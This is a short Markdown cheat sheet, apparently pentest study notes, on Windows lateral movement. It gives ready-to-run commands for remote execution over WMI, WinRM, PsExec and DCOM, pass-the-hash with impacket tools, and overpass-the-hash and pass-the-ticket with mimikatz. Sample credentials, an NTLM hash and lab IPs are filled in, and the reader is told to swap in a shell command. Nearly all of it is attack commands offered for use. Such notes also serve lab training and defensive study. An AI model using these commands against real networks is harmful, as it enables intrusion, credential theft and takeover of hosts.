# WMI 

cmd

```
wmic /node:<ip> /user:jen /password:Password123! process cal create "calc"
```

Powershell

```
$username = 'jen';
$password = 'Password123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'calc';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

change $command to a shell command

# WinRM

cmd

```
winrs -r:files04 -u:jen -p:Password123!  "cmd /c hostname & whoami"
```

Powershell

```
$username = 'jen';
$password = 'Password123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

New-PSSession -ComputerName 192.168.50.73 -Credential $credential

Enter-PSSession 1
```

# PsExec

```
.\PsExec64.exe -i \\hostname -u domain\username -p password cmd
```

# Pass the hash

```
impacket-wmiexec

impacket-psexec

impacket-smbexec
```

## Overpass the hash

Use the hash to obtain kerberos ticket

In mimikatz.exe

```
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

In powershell / cmd

```
.\PsExec.exe \\host cmd
```

# Pass the Ticket

in mimikatz

```
sekurlsa::tickets /export

kerberos::ptt <ticket.kirbi>
```

# DCOM

```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target IP>"))

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"<powershell command>","7")
```